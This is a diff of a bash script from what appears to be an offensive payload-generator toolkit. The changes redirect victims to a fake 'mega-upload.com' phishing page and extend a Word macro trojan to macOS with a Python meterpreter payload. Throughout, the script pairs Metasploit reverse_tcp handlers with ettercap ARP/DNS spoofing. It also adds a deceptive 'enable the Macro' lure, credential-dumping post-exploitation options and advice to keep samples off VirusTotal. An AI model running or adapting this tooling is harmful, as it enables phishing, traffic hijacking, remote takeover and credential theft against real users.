         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.php $D3F/$N4m.php
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
@@ -3436,7 +3419,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -3547,9 +3530,9 @@ echo "---"
 echo "- SEND THE URL GENERATED TO TARGET HOST"
 
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.php $D3F/$N4m.php
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
@@ -3557,7 +3540,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -3702,9 +3685,9 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m $D3F/$N4m
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
@@ -3712,7 +3695,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -3815,9 +3798,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "- SEND THE URL GENERATED TO TARGET HOST"
       echo "- THIS ATTACK VECTOR WILL TRIGGER PAYLOAD RCE"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.jar|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.jar|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.jar $D3F/$N4m.jar
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
@@ -3825,7 +3808,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -3921,9 +3904,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "- SEND THE URL GENERATED TO TARGET HOST"
       echo "- THIS ATTACK VECTOR WILL TRIGGER PAYLOAD RCE"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.jar|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.jar|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.jar $D3F/$N4m.jar
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
@@ -3931,7 +3914,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -4053,9 +4036,9 @@ echo "---"
 echo "- SEND THE URL GENERATED TO TARGET HOST"
 
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m $D3F/$N4m
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
@@ -4063,7 +4046,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
 
         else
@@ -4153,9 +4136,9 @@ echo "---"
 echo "- SEND THE URL GENERATED TO TARGET HOST"
 
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$filename.bat|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$filename.bat|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$filename.bat $D3F/$filename.bat
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
@@ -4163,7 +4146,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
 
         else
@@ -4285,9 +4268,9 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPAT
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.deb|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.deb|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.deb $D3F/$N4m.deb
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
@@ -4295,7 +4278,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPAT
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -4388,9 +4371,9 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.apk|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.apk|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.apk $D3F/$N4m.apk
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
@@ -4398,7 +4381,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -4520,9 +4503,9 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.exe $D3F/$N4m.exe
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
@@ -4531,7 +4514,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -4572,15 +4555,29 @@ cd $IPATH/
 
 
 
-# -----------------------------------------------------
-# astrobaby word macro trojan payload
-# ------------------------------------------------------
+# ---------------------------------------------------
+# astrobaby word macro trojan payload (windows.c) OR
+# exploit/multi/fileformat/office_word_macro (python)
+# ---------------------------------------------------
 sh_shellcode23 () {
 # get user input to build shellcode
 echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
+Targ=$(zenity --list --title "☠ CHOSE TARGET SYSTEM ☠" --text "chose target system .." --radiolist --column "Pick" --column "Option" TRUE "windows" FALSE "mac osx" --width 305 --height 100) > /dev/null 2>&1
+
+
+  # config rigth arch (payload+format)
+  if [ "$Targ" = "windows" ]; then
+    taa="0"
+    orm="C"
+    paa="windows/meterpreter/reverse_tcp"
+  else
+    taa="1"
+    orm="PYTHON"
+    paa="python/meterpreter/reverse_tcp"
+  fi
 
 
 # display final settings to user
@@ -4590,8 +4587,8 @@ cat << !
 +------------------
 | LPORT   : $lport
 | LHOST   : $lhost
-| FORMAT  : C -> WINDOWS
-| PAYLOAD : windows/meterpreter/reverse_tcp
+| FORMAT  : $orm -> $Targ
+| PAYLOAD : $paa
 |_AGENT   : $IPATH/output/$N4m.docm
 
 !
@@ -4623,7 +4620,8 @@ cat << !
       fi
 
 
-# building template
+# building template (windows systems)
+if [ "$Targ" = "windows" ]; then
 echo "[☠] editing/backup files .."
 cp $IPATH/templates/astrobaby.c $IPATH/templates/astrobaby[bk].c > /dev/nul 2>&1
 cd $IPATH/templates
@@ -4631,7 +4629,7 @@ sed -i "s|LhOsT|$lhost|g" astrobaby.c
 sed -i "s|lPoRt|$lport|g" astrobaby.c
 sleep 2
 
-# compiling template
+# compiling template (windows systems)
 echo "[☠] Compiling using mingw32 .."
 sleep 2
 # i586-mingw32msvc-gcc -mwindows suid.c -o payload.exe
@@ -4641,13 +4639,19 @@ mv payload.exe $IPATH/output/$N4m.exe > /dev/null 2>&1
 echo "[☠] Binary: $IPATH/output/$N4m.exe .."
 cd $IPATH
 sleep 2
+fi
 
 
 
 # use metasploit to build shellcode
 echo "[☠] Generating MS_word document .."
 sleep 2
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/windows/fileformat/office_word_macro; set EXE::Custom $IPATH/output/$N4m.exe; set BODY Please enable the Macro SECURITY WARNING in order to view the contents of the document; run; exit -y'" > /dev/null 2>&1
+if [ "$Targ" = "windows" ]; then
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/multi/fileformat/office_word_macro; set EXE::Custom $IPATH/output/$N4m.exe; set BODY Please enable the Macro SECURITY WARNING in order to view the contents of the document; set target $taa; set PAYLOAD $paa; set LHOST $lhost; run; exit -y'" > /dev/null 2>&1
+else
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/multi/fileformat/office_word_macro; set BODY Please enable the Macro SECURITY WARNING in order to view the contents of the document; set target $taa; set PAYLOAD $paa; set LHOST $lhost; run; exit -y'" > /dev/null 2>&1
+fi
+
 mv $H0m3/.msf4/local/msf.docm $IPATH/output/$N4m.docm > /dev/null 2>&1
 echo "[☠] MS_word agent: $IPATH/output/$N4m.docm .."
 sleep 2
@@ -4662,14 +4666,18 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
+xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; exploit'"
       sleep 2
 
 
    else
 
 
+if [ "$Targ" = "windows" ]; then
 P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" --width 305 --height 270) > /dev/null 2>&1
+else
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "post_multi.rc" --width 305 --height 200) > /dev/null 2>&1
+fi
 
 
       # edit files nedded
@@ -4683,9 +4691,9 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.docm|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.docm|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.docm $D3F/$N4m.docm
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
@@ -4694,7 +4702,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -4705,7 +4713,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
 
         fi
    fi
@@ -4815,9 +4823,9 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.ppsx|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.ppsx|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.ppsx $D3F/$N4m.ppsx
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
@@ -4826,7 +4834,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -5160,11 +5168,11 @@ cat << !
     | 16 - shellcode     webserver    PHP            PHP,PHP      |
     | 17 - shellcode     multi OS     PYTHON         PYTHON       |
     | 18 - shellcode     multi OS     JAVA,PSH       JAR(RCE)     |
-    | 19 - web_delivery  multi OS     PYTHON,PSH     SH,BAT       |
+    | 19 - web_delivery  multi OS     PYTHON,PSH     PYTHON,BAT   |
     | 20 - web_delivery  unix(s)      SH,PYTHON      DEB          |
     | 21 - shellcode     android      DALVIK         APK          |
     | 22 - shellcode     windows      EXE-SERVICE    EXE          |
-    | 23 - shellcode     windows      C              DOCM(word)   |
+    | 23 - shellcode     multi OS     C,PYTHON       DOCM(word)   |
     | 24 - shellcode     windows      PYTHON         PPSX(word)   |
     ╠─────────────────────────────────────────────────────────────╣
     |  S - system built-in shells                                 |
